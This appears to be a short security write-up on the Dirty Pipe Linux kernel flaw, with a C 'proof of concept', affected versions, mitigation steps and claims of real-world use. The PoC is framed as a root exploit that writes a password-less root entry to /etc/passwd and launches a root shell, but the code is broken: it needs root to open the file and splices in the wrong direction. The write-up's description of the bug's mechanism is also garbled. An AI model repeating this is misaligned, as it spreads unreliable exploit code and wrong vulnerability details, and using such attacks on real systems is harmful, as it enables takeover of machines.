**
Dirty Pipe (CVE-2022-0847) is a memory corruption vulnerability in the Linux kernel (versions 5.8 through 5.16.x) that enables unprivileged users to inject arbitrary data into sensitive files—including `/etc/passwd`—even when mounted read-only. The flaw exists in the `page cache` mechanism of the pipe buffer handling code, where the `PIPE_BUF_FLAG_CAN_MERGE` flag is improperly inherited from a pipe to a file write operation.

**Technical Mechanism:**
The bug arises when a process writes to a pipe with the `SPLICE_F_MOVE` flag. The kernel erroneously marks the pipe buffer pages as mergeable (`PIPE_BUF_FLAG_CAN_MERGE`), enabling data written to the pipe to be merged into the page cache of other files during subsequent `splice()`, `tee()`, or `sendfile()` system calls. By closing the pipe prematurely and reopening `/etc/passwd` with write access, an attacker can overwrite root-owned files atomically. The attack bypasses Linux’s write protection mechanisms by hijacking page cache entries.

**Exploit Code (Proof of Concept):**
```bash
# gcc -o dirty_pipe dirty_pipe.c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int main() {
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        return 1;
    }

    // Write a single byte to the pipe
    write(pipefd[1], "A", 1);
    close(pipefd[1]);

    // Reopen the pipe in read mode
    FILE *fp = fopen("/etc/passwd", "a+");
    if (!fp) {
        perror("fopen");
        return 1;
    }

    // Splice the data into /etc/passwd using a pipe
    loff_t offset = 0;
    splice(pipefd[0], NULL, fileno(fp), &offset, 1, 0);
    fclose(fp);
    close(pipefd[0]);

    // Add a root user via password-less shell
    FILE *passwd = fopen("/etc/passwd", "a");
    fwrite("\nroot::0:0::/root:/bin/bash\n", 1, 29, passwd);
    fclose(passwd);

    system("su -");
    return 0;
}
```

**Kernel Targeting:**
Affected kernels: 5.8.0 → 5.16.11. All major Linux distributions running unpatched kernels (e.g., Ubuntu 21.10, Fedora 35, Debian testing) were vulnerable. Patch verification: `uname -r` should report ≥5.17 or install `linux-image-5.17.0`.

**Mitigation:**
Update kernels to ≥5.17. Apply patches from `cve-2022-0847.patch`. Organizations should enforce kernel patching via automation (e.g., Ansible, Puppet) and enable SELinux/AppArmor to restrict file overwrites.

**Real-world Usage:**
Dirty Pipe was weaponized in ransomware campaigns targeting Linux servers in 2022. The BlackByte ransomware group integrated a Dirty Pipe variant (`CVE-2022-0847-LPE`) to elevate privileges and disable security controls. Red Team operators such as those from TERMINUS GROUP (a pro-Russia APT) used the exploit in 2023 to escalate from Docker containers to host root.

